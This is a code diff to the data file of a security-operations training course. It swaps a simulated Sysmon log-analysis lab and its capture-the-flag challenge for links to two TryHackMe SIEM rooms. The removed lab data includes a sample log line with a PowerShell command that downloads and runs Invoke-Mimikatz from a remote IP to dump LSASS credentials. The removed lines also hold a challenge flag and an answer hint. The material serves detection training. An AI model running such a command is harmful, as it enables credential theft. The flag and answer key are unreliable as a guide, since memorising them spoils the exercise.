@@ -258,7 +258,7 @@ export const SOC_MODULES = [
     difficulty: "Intermediate",
     duration: "55 Mins",
     slideCount: 32,
-    labCount: "4 Labs Completed (4/4)",
+    labCount: "2 TryHackMe Rooms",
     tags: ["Log Pipeline", "System Auditing", "Elasticsearch"],
     skills: ["Windows Event Logs", "System Auditing", "Elasticsearch & Fleet", "Elastic Agent", "KQL Log Filtering"],
     summary: "Master centralized log collection, Windows file system auditing, Event ID 4663 verification, and setting up Elastic Cloud, Fleet, and Elastic Agent telemetry pipelines.",
@@ -333,37 +333,34 @@ export const SOC_MODULES = [
     },
 
     lab: {
-      title: "Interactive Sysmon Log Analyzer",
-      scenario: "A Tier 1 alert indicates credential access. Review the Sysmon Event records below to identify the malicious process and the target PID.",
-      type: "sysmon-event-sim",
-      events: [
+      title: "TryHackMe SIEM Labs — Splunk & ELK",
+      scenario: "Click either TryHackMe room logo below to launch the Splunk or ELK (Elastic Stack) lab in a new tab.",
+      type: "tryhackme-rooms",
+      rooms: [
         {
-          eventId: 1,
-          time: "10:14:02",
-          source: "Sysmon",
-          computer: "DC-PRIMARY.CORP.LOCAL",
-          task: "Process Creation",
-          data: "Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | CommandLine: powershell.exe -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.22/invoke-mimikatz.ps1'); Invoke-Mimikatz\" | ParentImage: C:\\Windows\\explorer.exe | ProcessId: 7720"
+          id: "splunk-siem",
+          tool: "Splunk",
+          platform: "TryHackMe",
+          title: "Log Analysis with SIEM",
+          description: "Analyze centralized Windows, Linux, and web event logs using Splunk SIEM queries.",
+          url: "https://tryhackme.com/room/loganalysiswithsiem",
+          logo: "/soc-labs/module-03/splunk-loganalysiswithsiem.png",
+          accent: "#38bdf8"
         },
         {
-          eventId: 10,
-          time: "10:14:08",
-          source: "Sysmon",
-          computer: "DC-PRIMARY.CORP.LOCAL",
-          task: "Process Access",
-          data: "SourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1FFFFF | CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+... | SourceProcessId: 7720 | TargetProcessId: 648"
+          id: "elk-servidae",
+          tool: "ELK",
+          platform: "TryHackMe",
+          title: "Servidae",
+          description: "Investigate compromised workstation telemetry logs inside Elastic Stack (ELK) and Kibana.",
+          url: "https://tryhackme.com/room/servidae",
+          logo: "/soc-labs/module-03/elk-servidae.png",
+          accent: "#10b981"
         }
-      ],
-      taskInstructions: "1. Examine Event ID 10.\n2. Note the TargetProcessId of lsass.exe (648) and SourceProcessId (7720).\n3. Confirm that Mimikatz requested full handle access (0x1FFFFF) to LSASS memory."
+      ]
     },
 
-    challenge: {
-      question: "What is the Process ID (PID) of the malicious PowerShell process that dumped LSASS credentials in the lab?",
-      targetKey: "7720",
-      flag: "flag{sysm0n_lsass_cr3d_dump_f0und}",
-      hint: "Look at Event ID 10: SourceProcessId is 7720. The flag is flag{sysm0n_lsass_cr3d_dump_f0und}",
-      points: 150
-    }
+    challenge: null
   },
 
   {
